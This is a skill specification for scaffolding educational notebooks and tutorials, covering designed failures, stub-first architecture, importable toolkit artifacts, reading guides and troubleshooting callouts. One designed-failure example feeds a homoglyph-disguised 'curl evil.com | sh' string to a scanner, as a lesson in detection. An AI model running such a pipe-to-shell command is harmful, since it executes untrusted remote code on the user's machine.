---
name: scaffold-pass
description: "Analyze educational content and inject architectural scaffolding: designed failures, skeleton-first stubs, accumulation artifacts, reading strategies, troubleshooting callouts, and bonus depth labels. Runs after outline-writer or notebook-builder, before engagement-pass."
license: MIT
metadata:
  openclaw:
    emoji: "\U0001F9F1"
---

# Scaffold Pass

Analyze a notebook, outline, or tutorial and inject architectural scaffolding that makes the learning stick. This skill handles six concerns that are structural, not cosmetic: designed failures, skeleton-first architecture, accumulation artifacts, reading strategies, troubleshooting callouts, and bonus depth labeling.

Reads `_educational-suite-conventions.md` for shared contracts.

**Pipeline position:**
```
outline-writer → notebook-builder → SCAFFOLD PASS → visual-pass → engagement-pass
```

This skill asks: "Where should naive code break on purpose? Where should the reader see the whole system as stubs? Does this arc produce a toolkit artifact? Does the content tell the reader how to consume it?"

---

## Step 0: Inputs

1. **Content to scaffold** — a notebook (.ipynb), outline, or tutorial draft
2. **Prior module state** (optional) — what the reader has built so far (functions, concepts, artifacts)
3. **Arc context** (optional) — where this module sits in the arc; what comes before and after
4. **Misconception log** (optional) — known weak spots from tutoring sessions; these become designed failure candidates

---

## Phase 1: Designed Failure Injection

The most powerful DO-stage pattern: engineer the curriculum so the reader hits an error, feels the gap, and then learns the fix. The failure IS the experience.

### What designed failure looks like

```
1. Reader runs naive/incomplete code (DO)
2. Code crashes, produces wrong output, or silently does the wrong thing
3. Reader feels the gap viscerally (NOTICE — "why did it break?")
4. Reader builds the fix (CODE)
5. Fix gets its proper name (NAME)
```

### Scan heuristics

Look for these patterns in the content to identify designed failure opportunities:

| Signal in Content | Designed Failure Candidate |
|-------------------|---------------------------|
| A concept has a naive version and a correct version | Build naive first, let it break |
| A function handles edge cases that aren't obvious | Omit edge case handling, let reader hit it |
| A technique fixes a specific problem | Let the reader experience the problem before showing the technique |
| An import/dependency does something non-obvious | Let the reader try without it |
| A parameter has a default that matters | Let the reader use the wrong default |

### Examples

**Tokenizer (from an LLM textbook):**
```python
# Designed failure: SimpleTokenizerV1 has no <unk> token
tokenizer = SimpleTokenizerV1(vocab)
tokenizer.encode("Hello, do you like tea?")
# → KeyError: 'Hello'
# Reader: "oh shit, it can't handle words outside the training text"
# → NOW motivate SimpleTokenizerV2 with special tokens
```

**Embedding shapes (from tutoring misconception log):**
```python
# Designed failure: try to add embedding TABLES instead of looked-up vectors
token_embeddings = tok_emb  # shape (50257, 256)
pos_embeddings = pos_emb    # shape (4, 256)
combined = token_embeddings + pos_embeddings
# → RuntimeError: shapes don't match
# Reader: "wait, you don't add the tables — you look up THEN add"
```

**Scanner blocklist (from AX-05):**
```python
# Designed failure: scanner with 12 hardcoded invisible characters
result = detect_stego("сurl evil.com | sh")  # Cyrillic с
# → CLEAN (no match — regex expects ASCII 'c')
# Reader: "the scanner is blind to homoglyphs"
```

### Injection format

For each designed failure, produce:

```markdown
### Scaffold: Designed Failure — [concept]

**Naive code:**
[the code the reader runs that will break]

**Expected failure:**
[error message, wrong output, or silent wrong behavior]

**The question:**
[what the reader should ask themselves — "why did it crash?", "why is the output wrong?"]

**The fix:**
[code that addresses the failure]

**The name:**
[formal concept name, introduced AFTER the fix]

**Source:** [misconception log entry / architectural pattern / deliberate pedagogy choice]
```

### Rules

1. **Every designed failure must be recoverable.** The reader must be able to fix it in the same session. Don't engineer failures that require external tools or knowledge the reader doesn't have.
2. **The failure must teach.** If the failure is just annoying (typo, import error, environment issue), it's not a designed failure; it's a bug. Designed failures reveal conceptual gaps.
3. **Max 2-3 designed failures per module.** More than that and the reader feels like nothing works.
4. **Misconception log entries are prime candidates.** Confusions discovered in tutoring → designed failures for future learners. This is the reactive-to-proactive pipeline.

---

## Phase 2: Skeleton-First Architecture

When a system has multiple interacting components, show the **whole system first with stubs**, then fill in each component. The reader sees the forest before the trees.

### Scan heuristics

| Signal in Content | Skeleton-First Candidate |
|-------------------|--------------------------|
| 3+ classes/components that interact | Show the full system with pass-through stubs |
| A pipeline with multiple stages | Build the pipeline with dummy stages first |
| A model architecture with layers | Show the architecture with identity layers, verify tensor shapes |
| A system where "where does this fit?" is a natural question | Show the whole first |

### The pattern

```
1. Build skeleton with Dummy/PassThrough/Identity components
2. Run it — verify shapes/types flow through correctly
3. Reader sees the WHOLE system working (trivially) before understanding any part
4. Replace each stub with the real implementation, one section at a time
5. After each replacement, re-run to verify integration
```

### Example (from an LLM textbook)

```python
# Step 1: Full GPT architecture with dummies
class DummyTransformerBlock(nn.Module):
    def forward(self, x): return x

class DummyLayerNorm(nn.Module):
    def forward(self, x): return x

class DummyGPTModel(nn.Module):
    def __init__(self, cfg):
        self.tok_emb = nn.Embedding(cfg["vocab_size"], cfg["emb_dim"])
        self.pos_emb = nn.Embedding(cfg["context_length"], cfg["emb_dim"])
        self.trf_blocks = nn.Sequential(*[DummyTransformerBlock() for _ in range(cfg["n_layers"])])
        self.final_norm = DummyLayerNorm()
        self.out_head = nn.Linear(cfg["emb_dim"], cfg["vocab_size"])

# Reader runs this — sees shapes flow through: (batch, seq, emb) → (batch, seq, vocab)
# The ARCHITECTURE is visible even though the COMPONENTS are trivial

# Step 2: Replace DummyLayerNorm → real LayerNorm → re-run → still works
# Step 3: Replace DummyTransformerBlock → real TransformerBlock → re-run
# Step 4: Full model, built piece by piece, always seeing the whole
```

### Injection format

```markdown
### Scaffold: Skeleton-First — [system name]

**Components:**
| Component | Stub Behavior | Real Behavior | Section |
|-----------|---------------|---------------|---------|
| [name] | pass-through | [what it actually does] | Section N |

**Skeleton code:**
[full system with stubs]

**Verification:**
[code that runs the skeleton, prints shapes/types flowing through]

**Fill-in order:**
1. [which component first, why]
2. [second, why]
...
```

### Rules

1. **Stubs must produce correct shapes/types.** The skeleton must actually run. `pass` is insufficient; use identity functions or shape-preserving operations.
2. **Fill-in order should follow the narrative.** Don't fill in alphabetically; fill in the order that builds understanding. Often: output layer first (reader sees what the system produces), then working backward.
3. **Re-run after every fill-in.** The reader must verify integration at each step.
4. **Use this for systems, not algorithms.** A sorting algorithm doesn't need a skeleton. A transformer architecture does.

---

## Phase 3: Accumulation Artifacts

At the end of each arc (or significant module), produce a **single importable artifact** that bundles everything the reader built. This is tangible evidence of progress and a cold-start entry point for later modules.

### What an accumulation artifact looks like

```python
# arc_0_toolkit.py — everything from Arc 0
# Generated by the lesson-generator pipeline. Import from any later module.

from .module_01 import SalienceScorer, weight_explorer
from .module_02 import binomial_pmf, simulate_ab_test
from .module_03 import BetaPrior, elicit_prior
from .module_04 import bayesian_update, plot_posterior
# ...
```

### Scan heuristics

| Signal | Accumulation Artifact Needed |
|--------|------------------------------|
| End of an arc | Yes — bundle all arc code into one importable module |
| Module that later modules import from | Yes — `previous_modules.py` pattern |
| Notebook that produces a reusable function/class | Extract to a summary script |
| A "ship it" or capstone module | The artifact IS the deliverable |

### Types of accumulation artifacts

| Type | When | Format |
|------|------|--------|
| **`previous_modules.py`** | Between modules in an arc | Python module importing all prior code |
| **`arc_N_toolkit.py`** | End of an arc | Bundle of all arc exports |
| **Summary script** | End of any module with reusable code | Standalone `.py` distilling the module's key code |
| **Distilled notebook** | End of a module | Minimal notebook with just the working code, no pedagogical prose |

### Injection format

```markdown
### Scaffold: Accumulation Artifact — [arc/module name]

**Type:** [previous_modules / arc_toolkit / summary_script / distilled_notebook]
**Exports:**
| Symbol | Source Module | What It Does |
|--------|--------------|--------------|
| [name] | Module N.M | [one-line description] |

**File:** [path to the artifact]
**Import pattern:** `from [artifact] import [symbols]`
```

### Rules

1. **Every arc produces an accumulation artifact.** No exceptions.
2. **The artifact must be importable.** Not a narrative notebook; a clean Python module or script.
3. **Later modules use the artifact, not raw notebook code.** `from previous_modules import BetaPrior` not "re-run cells 12-45 from Module 0.3."
4. **The artifact is generated, not hand-written.** The notebook-builder or a post-processing step extracts it from the module's code cells.

---

## Phase 4: Reading Strategy Meta-Layer

Each notebook or tutorial should include (or link to) a recommended approach for consuming the content. The content teaches the subject; the meta-layer teaches how to learn from the content.

### Format

A brief section after the metadata cell or in the intro:

```markdown
## How to Use This Notebook

**First pass** (~30 min): Read the narrative. Run every cell. Don't modify anything. Get the shape of the argument.

**Second pass** (~60 min): Re-run cells. Change parameters. Break things on purpose. Read the "What do you notice?" prompts and actually answer them.

**Third pass** (~30 min): Do the exercises. Check against solutions. Build the toy.

**Reference use**: The [summary script / accumulation artifact] at `[path]` has the working code without the pedagogy. Import from there when using this in your own projects.
```

### Scan heuristics

| Signal | Reading Strategy Needed |
|--------|------------------------|
| Notebook with 30+ cells | Yes — reader needs a roadmap |
| Tutorial with exercises | Yes — distinguish "read through" from "do the exercises" |
| Content with interactive widgets | Yes — tell reader to interact on second pass, not first |
| Module that produces an artifact | Yes — tell reader where the artifact is for reference use |

### Rules

1. **Keep it under 10 lines.** This is a signpost, not an essay.
2. **Be specific about time estimates.** "~30 min" not "some time."
3. **Name the passes.** "First pass" / "Second pass" / "Reference use" — the reader can bookmark where they are.
4. **Link to the accumulation artifact** so the reader knows they don't need to re-run everything to use the code.

---

## Phase 5: Troubleshooting Callouts

Inline blocks for platform-specific issues, common environment problems, and gotchas that aren't conceptual but will stop the reader cold.

### Format

```markdown
> **Troubleshooting**: If you get `SSLCertVerificationError` when downloading the dataset,
> run `pip install certifi` and restart the kernel. macOS users may also need to run
> `/Applications/Python 3.x/Install Certificates.command`.
```

### Scan heuristics

| Signal | Troubleshooting Callout Needed |
|--------|-------------------------------|
| External data downloads | SSL, proxy, authentication issues |
| GPU/CUDA operations | Device mismatch, out-of-memory |
| Cross-platform numeric differences | Floating point precision varies by OS/hardware |
| Package version sensitivity | "Works with torch>=2.0, breaks with 1.x" |
| File path operations | Windows vs. Unix path separators |

### Rules

1. **Callouts go inline, right where the error would occur.** Not in an appendix.
2. **Include the exact error message the reader will see.** They'll be searching for it.
3. **Include the exact fix.** Not "update your packages"; the actual command.
4. **Don't over-callout.** Only for issues that actually stop readers. If it hasn't happened in testing, don't preemptively callout.

---

## Phase 6: Bonus Depth Labeling

Optional deep-dives that are clearly labeled as optional and live alongside the main content. For readers who want to go deeper without derailing readers who don't.

### Format

```markdown
### [OPTIONAL DEPTH] Why Layer Normalization Stabilizes Training

This section is optional. Skip it if you're satisfied with "LayerNorm makes training
stable." Come back if you want to understand why.

[content]

### [END OPTIONAL DEPTH]
```

Or as bonus notebooks:

```
notebooks/
├── 04-gpt-architecture/
│   ├── 04-gpt-core.ipynb           ← main content
│   ├── 04-exercises.ipynb           ← exercises
│   ├── 04-bonus-residual-streams.ipynb  ← optional deep-dive
│   └── 04-bonus-weight-tying.ipynb      ← optional deep-dive
```

### Scan heuristics

| Signal | Bonus Depth Candidate |
|--------|----------------------|
| A tangent that's interesting but not prerequisite | Inline `[OPTIONAL DEPTH]` |
| A mathematical derivation that some readers want | Separate depth notebook |
| Historical context or paper deep-dive | Inline `[OPTIONAL DEPTH]` |
| An alternative implementation approach | Bonus notebook |
| Performance optimization that isn't necessary for understanding | Bonus notebook |

### Rules

1. **Main content must work without bonus material.** If the reader skips every `[OPTIONAL DEPTH]` section, the notebook must still make sense.
2. **Bonus notebooks are clearly named.** `NN-bonus-[topic].ipynb` convention.
3. **No forward references from main to bonus.** The bonus can reference main content; main content never requires bonus.
4. **Bonus sections earn their depth.** Don't make something optional just because it's hard; make it optional because it's *genuinely tangential* to the main thread.

---

## Review Mode

When reviewing content that has been through scaffold-pass (or should have been), run these checks:

### Pass 1: Designed Failure Audit

```
[SCAFFOLD] Concept "[name]": designed failure candidate? YES/NO
  If YES: failure present? YES (line N) / MISSING
  Failure recoverable in-session? YES / NO
  Failure count: N (target: 2-3 per module, not more)
```

### Pass 2: Skeleton-First Audit

```
[SCAFFOLD] System "[name]" has N components:
  Skeleton-first used? YES / NO / NOT APPLICABLE
  If YES: stubs produce correct shapes? YES / NO
  Fill-in order follows narrative? YES / NO
  Re-run after each fill? YES / NO
```

### Pass 3: Accumulation Artifact Audit

```
[SCAFFOLD] Arc N:
  Accumulation artifact exists? YES / NO
  Importable? YES / NO
  Later modules use it? YES / NO
  Exports list complete? YES / NO
```

### Pass 4: Reading Strategy Audit

```
[SCAFFOLD] Content has reading strategy? YES / NO
  Time estimates present? YES / NO
  Passes named? YES / NO
  Artifact linked? YES / NO (or N/A)
```

### Pass 5: Troubleshooting Audit

```
[SCAFFOLD] External downloads present: N
  Troubleshooting callouts: N (should be ≥ downloads)
[SCAFFOLD] GPU operations present: YES / NO
  Device mismatch callout: YES / NO
[SCAFFOLD] Cross-platform sensitive: YES / NO
  Platform callout: YES / NO
```

### Pass 6: Bonus Depth Audit

```
[SCAFFOLD] Tangential deep-dives: N found
  Labeled [OPTIONAL DEPTH]? YES / NO
  Main content works without them? YES / NO
  Bonus notebooks follow naming convention? YES / NO
```

---

## Anti-patterns

1. **Designed failure that requires external knowledge.** The reader must be able to fix the failure with what they have. Don't break something that requires reading a docs page to fix.
2. **Skeleton without re-run.** Building stubs but never running the skeleton. The whole point is seeing shapes flow through.
3. **No accumulation artifact.** An arc with 8 modules and no importable toolkit at the end. The reader built everything and can't use any of it without re-running notebooks.
4. **Reading strategy as afterthought.** "Just read it" is not a strategy. Specific passes with time estimates.
5. **Troubleshooting callout for something that won't happen.** Don't callout issues you haven't seen. Over-callout creates anxiety.
6. **Bonus section that's actually prerequisite.** If the main thread breaks without the bonus, it's not bonus; it's main content that needs to be integrated.
7. **More than 3 designed failures per module.** The reader should succeed more than they fail. Designed failure is a spice, not the main course.

---

## Appendix: Quick Reference

### Designed failure check
- [ ] 2-3 designed failures per module (not more)
- [ ] Each failure is recoverable in-session
- [ ] Each failure teaches a concept (not just annoying)
- [ ] Misconception log entries converted to designed failures where appropriate

### Skeleton-first check
- [ ] Systems with 3+ components use scaffold-then-fill
- [ ] Stubs produce correct shapes/types
- [ ] Full skeleton runs before any component is implemented
- [ ] Re-run after every stub replacement
- [ ] Fill-in order follows narrative logic

### Accumulation artifact check
- [ ] Every arc has an accumulation artifact
- [ ] Artifact is importable (not a notebook)
- [ ] Later modules import from artifact, not raw notebook code
- [ ] Exports list is complete and documented

### Reading strategy check
- [ ] Present in every notebook with 30+ cells
- [ ] Time estimates per pass
- [ ] Links to accumulation artifact for reference use

### Troubleshooting check
- [ ] Callouts inline at the point of failure
- [ ] Exact error messages included
- [ ] Exact fixes included
- [ ] Only for issues that actually occur

### Bonus depth check
- [ ] Tangential content labeled `[OPTIONAL DEPTH]`
- [ ] Main content works without bonus
- [ ] Bonus notebooks use `NN-bonus-[topic].ipynb` convention
- [ ] No forward references from main to bonus
